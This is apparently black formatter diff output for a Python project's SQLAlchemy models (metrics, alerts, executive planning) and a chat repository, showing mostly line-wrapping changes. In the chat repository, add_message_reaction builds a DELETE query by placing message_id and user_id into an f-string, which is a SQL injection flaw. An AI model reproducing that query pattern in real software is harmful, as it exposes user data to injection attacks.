 class AlertSource(enum.Enum):
     """Alert sources."""
+
     SYSTEM = "system"
     USER = "user"
     AGENT = "agent"
     MONITORING = "monitoring"
     SECURITY = "security"
@@ -77,22 +92,33 @@
 
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     name = Column(String(255), nullable=False, index=True)
     value = Column(Float, nullable=False)
     type = Column(SQLEnum(MetricType), nullable=False, default=MetricType.GAUGE)
-    category = Column(SQLEnum(MetricCategory), nullable=False, default=MetricCategory.SYSTEM)
+    category = Column(
+        SQLEnum(MetricCategory), nullable=False, default=MetricCategory.SYSTEM
+    )
     labels = Column(JSON, nullable=True)  # Key-value pairs for labels/tags
-    timestamp = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc), index=True)
-    agent_id = Column(String(255), nullable=True, index=True)  # Optional agent identifier
-    service_name = Column(String(255), nullable=True, index=True)  # Service that generated the metric
+    timestamp = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+        index=True,
+    )
+    agent_id = Column(
+        String(255), nullable=True, index=True
+    )  # Optional agent identifier
+    service_name = Column(
+        String(255), nullable=True, index=True
+    )  # Service that generated the metric
 
     # Indexes for efficient querying
     __table_args__ = (
-        Index('idx_metric_name_timestamp', 'name', 'timestamp'),
-        Index('idx_metric_category_timestamp', 'category', 'timestamp'),
-        Index('idx_metric_agent_timestamp', 'agent_id', 'timestamp'),
-        Index('idx_metric_service_timestamp', 'service_name', 'timestamp'),
+        Index("idx_metric_name_timestamp", "name", "timestamp"),
+        Index("idx_metric_category_timestamp", "category", "timestamp"),
+        Index("idx_metric_agent_timestamp", "agent_id", "timestamp"),
+        Index("idx_metric_service_timestamp", "service_name", "timestamp"),
     )
 
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary."""
         return {
@@ -112,11 +138,16 @@
     """Model for storing system-level metrics snapshots."""
 
     __tablename__ = "system_metrics"
 
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
-    timestamp = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc), index=True)
+    timestamp = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+        index=True,
+    )
 
     # System metrics
     cpu_usage_percent = Column(Float, nullable=True)
     memory_total_bytes = Column(BigInteger, nullable=True)
     memory_used_bytes = Column(BigInteger, nullable=True)
@@ -179,11 +210,16 @@
 
     __tablename__ = "agent_metrics"
 
     id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
     agent_id = Column(String(255), nullable=False, index=True)
-    timestamp = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc), index=True)
+    timestamp = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+        index=True,
+    )
 
     # Agent status
     status = Column(String(50), nullable=False)
     uptime_seconds = Column(Float, nullable=True)
     error_count = Column(Integer, nullable=False, default=0)
@@ -204,12 +240,12 @@
     # Additional metadata
     agent_metadata = Column(JSON, nullable=True)
 
     # Indexes for efficient querying
     __table_args__ = (
-        Index('idx_agent_metrics_agent_timestamp', 'agent_id', 'timestamp'),
-        Index('idx_agent_metrics_status_timestamp', 'status', 'timestamp'),
+        Index("idx_agent_metrics_agent_timestamp", "agent_id", "timestamp"),
+        Index("idx_agent_metrics_status_timestamp", "status", "timestamp"),
     )
 
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary."""
         return {
@@ -217,12 +253,16 @@
             "agent_id": self.agent_id,
             "timestamp": self.timestamp.isoformat(),
             "status": self.status,
             "uptime_seconds": self.uptime_seconds,
             "error_count": self.error_count,
-            "last_error_time": self.last_error_time.isoformat() if self.last_error_time else None,
-            "last_success_time": self.last_success_time.isoformat() if self.last_success_time else None,
+            "last_error_time": (
+                self.last_error_time.isoformat() if self.last_error_time else None
+            ),
+            "last_success_time": (
+                self.last_success_time.isoformat() if self.last_success_time else None
+            ),
             "performance": {
                 "requests_total": self.requests_total,
                 "requests_success": self.requests_success,
                 "requests_failed": self.requests_failed,
                 "avg_response_time_ms": self.avg_response_time_ms,
@@ -252,11 +292,16 @@
     # Alert details and metadata
     details = Column(JSON, nullable=True)
     labels = Column(JSON, nullable=True)
 
     # Timestamps
-    timestamp = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc), index=True)
+    timestamp = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+        index=True,
+    )
     acknowledged = Column(Boolean, nullable=False, default=False)
     acknowledged_time = Column(DateTime(timezone=True), nullable=True)
     acknowledged_by = Column(String(255), nullable=True)
 
     # Correlation and tracking
@@ -269,15 +314,15 @@
     resolved_by = Column(String(255), nullable=True)
     resolution_notes = Column(Text, nullable=True)
 
     # Indexes for efficient querying
     __table_args__ = (
-        Index('idx_alert_level_timestamp', 'level', 'timestamp'),
-        Index('idx_alert_category_timestamp', 'category', 'timestamp'),
-        Index('idx_alert_source_timestamp', 'source', 'timestamp'),
-        Index('idx_alert_acknowledged_timestamp', 'acknowledged', 'timestamp'),
-        Index('idx_alert_resolved_timestamp', 'resolved', 'timestamp'),
+        Index("idx_alert_level_timestamp", "level", "timestamp"),
+        Index("idx_alert_category_timestamp", "category", "timestamp"),
+        Index("idx_alert_source_timestamp", "source", "timestamp"),
+        Index("idx_alert_acknowledged_timestamp", "acknowledged", "timestamp"),
+        Index("idx_alert_resolved_timestamp", "resolved", "timestamp"),
     )
 
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary."""
         return {
@@ -290,16 +335,20 @@
             "source": self.source.value,
             "details": self.details or {},
             "labels": self.labels or {},
             "timestamp": self.timestamp.isoformat(),
             "acknowledged": self.acknowledged,
-            "acknowledged_time": self.acknowledged_time.isoformat() if self.acknowledged_time else None,
+            "acknowledged_time": (
+                self.acknowledged_time.isoformat() if self.acknowledged_time else None
+            ),
             "acknowledged_by": self.acknowledged_by,
             "correlation_id": self.correlation_id,
             "fingerprint": self.fingerprint,
             "resolved": self.resolved,
-            "resolved_time": self.resolved_time.isoformat() if self.resolved_time else None,
+            "resolved_time": (
+                self.resolved_time.isoformat() if self.resolved_time else None
+            ),
             "resolved_by": self.resolved_by,
             "resolution_notes": self.resolution_notes,
         }
 
 
@@ -313,16 +362,26 @@
     warning_threshold = Column(Float, nullable=True)
     critical_threshold = Column(Float, nullable=True)
 
     # Threshold configuration
     enabled = Column(Boolean, nullable=False, default=True)
-    comparison_operator = Column(String(10), nullable=False, default=">=")  # >=, <=, ==, !=
+    comparison_operator = Column(
+        String(10), nullable=False, default=">="
+    )  # >=, <=, ==, !=
 
     # Metadata
     description = Column(Text, nullable=True)
-    created_at = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc))
-    updated_at = Column(DateTime(timezone=True), nullable=False, default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+    )
+    updated_at = Column(
+        DateTime(timezone=True),
+        nullable=False,
+        default=lambda: datetime.now(timezone.utc),
+    )
     created_by = Column(String(255), nullable=True)
     updated_by = Column(String(255), nullable=True)
 
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary."""
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/metrics.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/models/executive_models.py	2025-06-14 20:35:30.807778+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/models/executive_models.py	2025-06-19 04:04:00.749471+00:00
@@ -6,308 +6,371 @@
 resource allocations, and risk assessments.
 """
 
 from datetime import datetime, timezone
 from decimal import Decimal
-from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean, Numeric, JSON, ForeignKey, Index
+from sqlalchemy import (
+    Column,
+    Integer,
+    String,
+    Text,
+    DateTime,
+    Boolean,
+    Numeric,
+    JSON,
+    ForeignKey,
+    Index,
+)
 from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy.orm import relationship
 from sqlalchemy.dialects.postgresql import UUID
 import uuid
 
 from fs_agt_clean.database.models.base import Base
 
 
 class ExecutiveDecisionModel(Base):
     """Executive decision records."""
+
     __tablename__ = "executive_decisions"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    decision_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
+
+    id = Column(Integer, primary_key=True, index=True)
+    decision_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
     decision_type = Column(String(50), nullable=False, index=True)
     title = Column(String(200), nullable=False)
     description = Column(Text)
-    
+
     # Decision context and analysis
     context = Column(JSON)
     criteria = Column(JSON)  # List of decision criteria
     alternatives = Column(JSON)  # List of decision alternatives
     recommended_alternative = Column(String(100))
     recommendation_reasoning = Column(Text)
     confidence_score = Column(Numeric(3, 2))
-    
+
     # Financial impact
     financial_impact = Column(JSON)
-    
+
     # Risk assessment
     risk_assessment = Column(JSON)  # List of risk factors
-    
+
     # Implementation
     implementation_plan = Column(JSON)  # List of implementation steps
     success_metrics = Column(JSON)  # List of success metrics
-    
+
     # Approval workflow
     approval_required = Column(Boolean, default=True)
     urgency = Column(String(20), default="medium")
     stakeholders = Column(JSON)  # List of stakeholders
-    
+
     # Status tracking
     status = Column(String(20), default="pending", index=True)
     created_by = Column(String(100), default="executive_agent")
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
     approved_at = Column(DateTime(timezone=True))
     approved_by = Column(String(100))
-    
+
     # Indexes for performance
     __table_args__ = (
-        Index('idx_executive_decisions_type_status', 'decision_type', 'status'),
-        Index('idx_executive_decisions_created_at', 'created_at'),
-        Index('idx_executive_decisions_urgency', 'urgency'),
+        Index("idx_executive_decisions_type_status", "decision_type", "status"),
+        Index("idx_executive_decisions_created_at", "created_at"),
+        Index("idx_executive_decisions_urgency", "urgency"),
     )
 
 
 class StrategicPlanModel(Base):
     """Strategic business plans."""
+
     __tablename__ = "strategic_plans"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    plan_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
+
+    id = Column(Integer, primary_key=True, index=True)
+    plan_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
     name = Column(String(200), nullable=False)
     description = Column(Text)
-    time_horizon = Column(String(20), nullable=False)  # "quarterly", "1_year", "3_year", "5_year"
-    
+    time_horizon = Column(
+        String(20), nullable=False
+    )  # "quarterly", "1_year", "3_year", "5_year"
+
     # Strategic elements
     objectives = Column(JSON)  # List of business objectives
     initiatives = Column(JSON)  # List of business initiatives
     total_budget = Column(Numeric(15, 2))
     expected_roi = Column(Numeric(5, 2))
-    
+
     # Success criteria
     key_metrics = Column(JSON)  # List of key metrics
     success_criteria = Column(JSON)  # List of success criteria
-    
+
     # Risk and milestones
     risks = Column(JSON)  # List of risk factors
     milestones = Column(JSON)  # List of milestones
-    
+
     # Status and approval
     status = Column(String(20), default="draft", index=True)
     created_by = Column(String(100))
     approved_by = Column(String(100))
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
     approved_at = Column(DateTime(timezone=True))
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_strategic_plans_horizon_status', 'time_horizon', 'status'),
-        Index('idx_strategic_plans_created_at', 'created_at'),
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_strategic_plans_horizon_status", "time_horizon", "status"),
+        Index("idx_strategic_plans_created_at", "created_at"),
     )
 
 
 class BusinessInitiativeModel(Base):
     """Business initiatives and projects."""
+
     __tablename__ = "business_initiatives"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    initiative_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    strategic_plan_id = Column(String(50), ForeignKey('strategic_plans.plan_id'))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    initiative_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+    strategic_plan_id = Column(String(50), ForeignKey("strategic_plans.plan_id"))
+
     name = Column(String(200), nullable=False)
     description = Column(Text)
     objective = Column(String(50), nullable=False, index=True)
     priority = Column(String(20), nullable=False, index=True)
-    
+
     # Financial projections
     estimated_cost = Column(Numeric(15, 2))
     estimated_revenue = Column(Numeric(15, 2))
     estimated_roi = Column(Numeric(5, 2))
     timeline_months = Column(Integer)
-    
+
     # Resources and requirements
     required_resources = Column(JSON)
     success_metrics = Column(JSON)
     risks = Column(JSON)
     dependencies = Column(JSON)
-    
+
     # Status tracking
     status = Column(String(20), default="proposed", index=True)
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
-    
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
+
     # Relationship
     strategic_plan = relationship("StrategicPlanModel", backref="initiatives")
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_business_initiatives_objective_priority', 'objective', 'priority'),
-        Index('idx_business_initiatives_status_created', 'status', 'created_at'),
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_business_initiatives_objective_priority", "objective", "priority"),
+        Index("idx_business_initiatives_status_created", "status", "created_at"),
     )
 
 
 class ResourceAllocationModel(Base):
     """Resource allocation records."""
+
     __tablename__ = "resource_allocations"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    allocation_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    initiative_id = Column(String(50), ForeignKey('business_initiatives.initiative_id'))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    allocation_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+    initiative_id = Column(String(50), ForeignKey("business_initiatives.initiative_id"))
+
     resource_type = Column(String(50), nullable=False, index=True)
     amount = Column(Numeric(15, 2))
     unit = Column(String(20))
     justification = Column(Text)
     priority_score = Column(Numeric(3, 2))
-    
+
     # Expected impact and constraints
     expected_impact = Column(JSON)
     constraints = Column(JSON)
     alternatives = Column(JSON)
-    
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
-    
+
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
+
     # Relationship
     initiative = relationship("BusinessInitiativeModel", backref="resource_allocations")
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_resource_allocations_type_amount', 'resource_type', 'amount'),
-        Index('idx_resource_allocations_created_at', 'created_at'),
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_resource_allocations_type_amount", "resource_type", "amount"),
+        Index("idx_resource_allocations_created_at", "created_at"),
     )
 
 
 class RiskAssessmentModel(Base):
     """Risk assessment records."""
+
     __tablename__ = "risk_assessments"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    assessment_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    assessment_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+
     # Assessment context
-    assessment_type = Column(String(50), nullable=False, index=True)  # "initiative", "decision", "strategic"
-    related_entity_id = Column(String(50), index=True)  # ID of related initiative/decision/plan
-    
+    assessment_type = Column(
+        String(50), nullable=False, index=True
+    )  # "initiative", "decision", "strategic"
+    related_entity_id = Column(
+        String(50), index=True
+    )  # ID of related initiative/decision/plan
+
     # Risk analysis results
     overall_risk_level = Column(String(20), nullable=False, index=True)
     risk_score = Column(Numeric(3, 2))
     identified_risks = Column(JSON)  # List of risk factors
     risk_scenarios = Column(JSON)  # List of risk scenarios
-    
+
     # Mitigation and monitoring
     mitigation_plan = Column(JSON)  # List of mitigation strategies
     monitoring_requirements = Column(JSON)  # List of monitoring requirements
     contingency_recommendations = Column(JSON)  # List of contingency recommendations
-    
+
     # Assessment metadata
     risk_tolerance_alignment = Column(String(100))
     confidence_score = Column(Numeric(3, 2))
-    
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_risk_assessments_type_level', 'assessment_type', 'overall_risk_level'),
-        Index('idx_risk_assessments_entity_created', 'related_entity_id', 'created_at'),
+
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
+
+    # Indexes
+    __table_args__ = (
+        Index(
+            "idx_risk_assessments_type_level", "assessment_type", "overall_risk_level"
+        ),
+        Index("idx_risk_assessments_entity_created", "related_entity_id", "created_at"),
     )
 
 
 class InvestmentOpportunityModel(Base):
     """Investment opportunity analysis."""
+
     __tablename__ = "investment_opportunities"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    opportunity_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    opportunity_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+
     name = Column(String(200), nullable=False)
     description = Column(Text)
     investment_type = Column(String(50), nullable=False, index=True)
-    
+
     # Financial analysis
     required_investment = Column(Numeric(15, 2))
     expected_return = Column(Numeric(15, 2))
     payback_period_months = Column(Integer)
     roi = Column(Numeric(5, 2))
     npv = Column(Numeric(15, 2))  # Net Present Value
     irr = Column(Numeric(5, 2))  # Internal Rate of Return
-    
+
     # Risk and market analysis
     risk_assessment = Column(String(20), index=True)
     market_size = Column(Numeric(15, 2))
     competitive_advantage = Column(JSON)
     success_probability = Column(Numeric(3, 2))
-    
+
     # Projections and analysis
     financial_projections = Column(JSON)
     risks = Column(JSON)
     recommendation = Column(Text)
     confidence_score = Column(Numeric(3, 2))
-    
-    created_at = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_investment_opportunities_type_roi', 'investment_type', 'roi'),
-        Index('idx_investment_opportunities_risk_return', 'risk_assessment', 'expected_return'),
+
+    created_at = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_investment_opportunities_type_roi", "investment_type", "roi"),
+        Index(
+            "idx_investment_opportunities_risk_return",
+            "risk_assessment",
+            "expected_return",
+        ),
     )
 
 
 class PerformanceKPIModel(Base):
     """Key Performance Indicator tracking."""
+
     __tablename__ = "performance_kpis"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    kpi_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    kpi_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+
     name = Column(String(200), nullable=False)
     description = Column(Text)
     category = Column(String(50), nullable=False, index=True)
-    
+
     # Current performance
     current_value = Column(Numeric(15, 4))
     target_value = Column(Numeric(15, 4))
     unit = Column(String(20))
-    
+
     # Performance analysis
     trend = Column(String(20), default="stable", index=True)
     performance_status = Column(String(20), default="on_track", index=True)
     historical_values = Column(JSON)
     benchmark_value = Column(Numeric(15, 4))
-    
+
     # Ownership and updates
     owner = Column(String(100))
     update_frequency = Column(String(20))
-    last_updated = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_performance_kpis_category_status', 'category', 'performance_status'),
-        Index('idx_performance_kpis_trend_updated', 'trend', 'last_updated'),
+    last_updated = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_performance_kpis_category_status", "category", "performance_status"),
+        Index("idx_performance_kpis_trend_updated", "trend", "last_updated"),
     )
 
 
 class BusinessIntelligenceModel(Base):
     """Business intelligence data for decision making."""
+
     __tablename__ = "business_intelligence"
-    
-    id = Column(Integer, primary_key=True, index=True)
-    data_id = Column(String(50), unique=True, index=True, default=lambda: str(uuid.uuid4()))
-    
+
+    id = Column(Integer, primary_key=True, index=True)
+    data_id = Column(
+        String(50), unique=True, index=True, default=lambda: str(uuid.uuid4())
+    )
+
     data_type = Column(String(50), nullable=False, index=True)
     source = Column(String(100), nullable=False)
-    
+
     # Intelligence data
     metrics = Column(JSON)
     insights = Column(JSON)
     trends = Column(JSON)
     recommendations = Column(JSON)
-    
+
     # Data quality
     confidence_level = Column(Numeric(3, 2))
     data_quality = Column(String(20), default="high")
-    
+
     # Validity
-    last_updated = Column(DateTime(timezone=True), default=lambda: datetime.now(timezone.utc))
+    last_updated = Column(
+        DateTime(timezone=True), default=lambda: datetime.now(timezone.utc)
+    )
     valid_until = Column(DateTime(timezone=True))
-    
-    # Indexes
-    __table_args__ = (
-        Index('idx_business_intelligence_type_source', 'data_type', 'source'),
-        Index('idx_business_intelligence_updated_valid', 'last_updated', 'valid_until'),
-    )
+
+    # Indexes
+    __table_args__ = (
+        Index("idx_business_intelligence_type_source", "data_type", "source"),
+        Index("idx_business_intelligence_updated_valid", "last_updated", "valid_until"),
+    )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/models/executive_models.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/chat_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/chat_repository.py	2025-06-19 04:04:00.744034+00:00
@@ -11,11 +11,16 @@
 
 from sqlalchemy import select, desc, func, text
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy.orm import selectinload
 
-from fs_agt_clean.database.models.chat import Conversation, Message, ChatSession, MessageReaction
+from fs_agt_clean.database.models.chat import (
+    Conversation,
+    Message,
+    ChatSession,
+    MessageReaction,
+)
 from fs_agt_clean.database.base_repository import BaseRepository
 
 
 class ChatRepository(BaseRepository):
     """Repository for chat-related database operations."""
@@ -27,85 +32,81 @@
     async def create_conversation(
         self,
         session: AsyncSession,
         user_id: str,
         title: Optional[str] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> Conversation:
         """Create a new conversation.
-        
+
         Args:
             session: Database session
             user_id: ID of the user creating the conversation
             title: Optional title for the conversation
             metadata: Optional metadata for the conversation
-            
+
         Returns:
             Created conversation
         """
         conversation = Conversation(
-            user_id=uuid.UUID(user_id),
-            title=title,
-            extra_metadata=metadata or {}
-        )
-        
+            user_id=uuid.UUID(user_id), title=title, extra_metadata=metadata or {}
+        )
+
         session.add(conversation)
         await session.commit()
         await session.refresh(conversation)
-        
+
         return conversation
 
     async def get_conversation(
         self,
         session: AsyncSession,
         conversation_id: str,
-        include_messages: bool = False
+        include_messages: bool = False,
     ) -> Optional[Conversation]:
         """Get a conversation by ID.
-        
+
         Args:
             session: Database session
             conversation_id: ID of the conversation
             include_messages: Whether to include messages in the result
-            
+
         Returns:
             Conversation if found, None otherwise
         """
-        query = select(Conversation).where(Conversation.id == uuid.UUID(conversation_id))
-        
+        query = select(Conversation).where(
+            Conversation.id == uuid.UUID(conversation_id)
+        )
+
         if include_messages:
             query = query.options(selectinload(Conversation.messages))
-        
+
         result = await session.execute(query)
         return result.scalar_one_or_none()
 
     async def get_user_conversations(
-        self,
-        session: AsyncSession,
-        user_id: str,
-        limit: int = 50,
-        offset: int = 0
+        self, session: AsyncSession, user_id: str, limit: int = 50, offset: int = 0
     ) -> List[Conversation]:
         """Get conversations for a user.
-        
+
         Args:
             session: Database session
             user_id: ID of the user
             limit: Maximum number of conversations to return
             offset: Number of conversations to skip
-            
+
         Returns:
             List of conversations
         """
         query = (
             select(Conversation)
             .where(Conversation.user_id == uuid.UUID(user_id))
             .order_by(desc(Conversation.updated_at))
             .limit(limit)
             .offset(offset)
         )
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def create_message(
         self,
@@ -114,92 +115,92 @@
         content: str,
         sender: str,
         agent_type: Optional[str] = None,
         thread_id: Optional[str] = None,
         parent_id: Optional[str] = None,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> Message:
         """Create a new message.
-        
+
         Args:
             session: Database session
             conversation_id: ID of the conversation
             content: Message content
             sender: Message sender ('user', 'agent', 'system')
             agent_type: Type of agent if sender is 'agent'
             thread_id: Optional thread ID for threading
             parent_id: Optional parent message ID for replies
             metadata: Optional metadata for the message
-            
+
         Returns:
             Created message
         """
         message = Message(
             conversation_id=uuid.UUID(conversation_id),
             content=content,
             sender=sender,
             agent_type=agent_type,
             thread_id=uuid.UUID(thread_id) if thread_id else None,
             parent_id=uuid.UUID(parent_id) if parent_id else None,
-            extra_metadata=metadata or {}
-        )
-        
+            extra_metadata=metadata or {},
+        )
+
         session.add(message)
         await session.commit()
         await session.refresh(message)
-        
+
         # Update conversation's updated_at timestamp
         await session.execute(
-            text("UPDATE conversations SET updated_at = NOW() WHERE id = :conversation_id"),
-            {"conversation_id": conversation_id}
-        )
-        await session.commit()
-        
+            text(
+                "UPDATE conversations SET updated_at = NOW() WHERE id = :conversation_id"
+            ),
+            {"conversation_id": conversation_id},
+        )
+        await session.commit()
+
         return message
 
     async def get_conversation_messages(
         self,
         session: AsyncSession,
         conversation_id: str,
         limit: int = 100,
         offset: int = 0,
-        include_reactions: bool = False
+        include_reactions: bool = False,
     ) -> List[Message]:
         """Get messages for a conversation.
-        
+
         Args:
             session: Database session
             conversation_id: ID of the conversation
             limit: Maximum number of messages to return
             offset: Number of messages to skip
             include_reactions: Whether to include message reactions
-            
+
         Returns:
             List of messages
         """
         query = (
             select(Message)
             .where(Message.conversation_id == uuid.UUID(conversation_id))
             .order_by(Message.timestamp)
             .limit(limit)
             .offset(offset)
         )
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def get_message(
-        self,
-        session: AsyncSession,
-        message_id: str
+        self, session: AsyncSession, message_id: str
     ) -> Optional[Message]:
         """Get a message by ID.
-        
+
         Args:
             session: Database session
             message_id: ID of the message
-            
+
         Returns:
             Message if found, None otherwise
         """
         query = select(Message).where(Message.id == uuid.UUID(message_id))
         result = await session.execute(query)
@@ -209,128 +210,122 @@
         self,
         session: AsyncSession,
         conversation_id: str,
         user_id: str,
         session_token: str,
-        metadata: Optional[Dict[str, Any]] = None
+        metadata: Optional[Dict[str, Any]] = None,
     ) -> ChatSession:
         """Create a new chat session.
-        
+
         Args:
             session: Database session
             conversation_id: ID of the conversation
             user_id: ID of the user
             session_token: Unique session token
             metadata: Optional metadata for the session
-            
+
         Returns:
             Created chat session
         """
         chat_session = ChatSession(
             conversation_id=uuid.UUID(conversation_id),
             user_id=uuid.UUID(user_id),
             session_token=session_token,
-            extra_metadata=metadata or {}
-        )
-        
+            extra_metadata=metadata or {},
+        )
+
         session.add(chat_session)
         await session.commit()
         await session.refresh(chat_session)
-        
+
         return chat_session
 
     async def get_active_chat_sessions(
-        self,
-        session: AsyncSession,
-        conversation_id: str
+        self, session: AsyncSession, conversation_id: str
     ) -> List[ChatSession]:
         """Get active chat sessions for a conversation.
-        
-        Args:
-            session: Database session
-            conversation_id: ID of the conversation
-            
+
+        Args:
+            session: Database session
+            conversation_id: ID of the conversation
+
         Returns:
             List of active chat sessions
         """
         query = (
             select(ChatSession)
             .where(
                 ChatSession.conversation_id == uuid.UUID(conversation_id),
-                ChatSession.is_active == "true"
+                ChatSession.is_active == "true",
             )
             .order_by(desc(ChatSession.last_activity))
         )
-        
+
         result = await session.execute(query)
         return result.scalars().all()
 
     async def add_message_reaction(
-        self,
-        session: AsyncSession,
-        message_id: str,
-        user_id: str,
-        reaction_type: str
+        self, session: AsyncSession, message_id: str, user_id: str, reaction_type: str
     ) -> MessageReaction:
         """Add a reaction to a message.
-        
+
         Args:
             session: Database session
             message_id: ID of the message
             user_id: ID of the user
             reaction_type: Type of reaction ('like', 'dislike', 'helpful', 'not_helpful')
-            
+
         Returns:
             Created message reaction
         """
         # Remove existing reaction from this user for this message
         await session.execute(
             f"DELETE FROM message_reactions WHERE message_id = '{message_id}' AND user_id = '{user_id}'"
         )
-        
+
         reaction = MessageReaction(
             message_id=uuid.UUID(message_id),
             user_id=uuid.UUID(user_id),
-            reaction_type=reaction_type
-        )
-        
+            reaction_type=reaction_type,
+        )
+
         session.add(reaction)
         await session.commit()
         await session.refresh(reaction)
-        
+
         return reaction
 
     async def get_conversation_stats(
-        self,
-        session: AsyncSession,
-        conversation_id: str
+        self, session: AsyncSession, conversation_id: str
     ) -> Dict[str, Any]:
         """Get statistics for a conversation.
-        
-        Args:
-            session: Database session
-            conversation_id: ID of the conversation
-            
+
+        Args:
+            session: Database session
+            conversation_id: ID of the conversation
+
         Returns:
             Dictionary with conversation statistics
         """
         # Get message count
         message_count_query = select(func.count(Message.id)).where(
             Message.conversation_id == uuid.UUID(conversation_id)
         )
         message_count_result = await session.execute(message_count_query)
         message_count = message_count_result.scalar()
-        
+
         # Get last message timestamp
         last_message_query = (
             select(Message.timestamp)
             .where(Message.conversation_id == uuid.UUID(conversation_id))
             .order_by(desc(Message.timestamp))
             .limit(1)
         )
         last_message_result = await session.execute(last_message_query)
         last_message_time = last_message_result.scalar()
-        
+
         return {
             "message_count": message_count,
-            "last_message_at": last_message_time.isoformat() if last_message_time else None
+            "last_message_at": (
+                last_message_time.isoformat() if last_message_time else None
+            ),
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/chat_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/test_test_listing_repository_simple.py	2025-06-14 20:35:30.811786+00:00
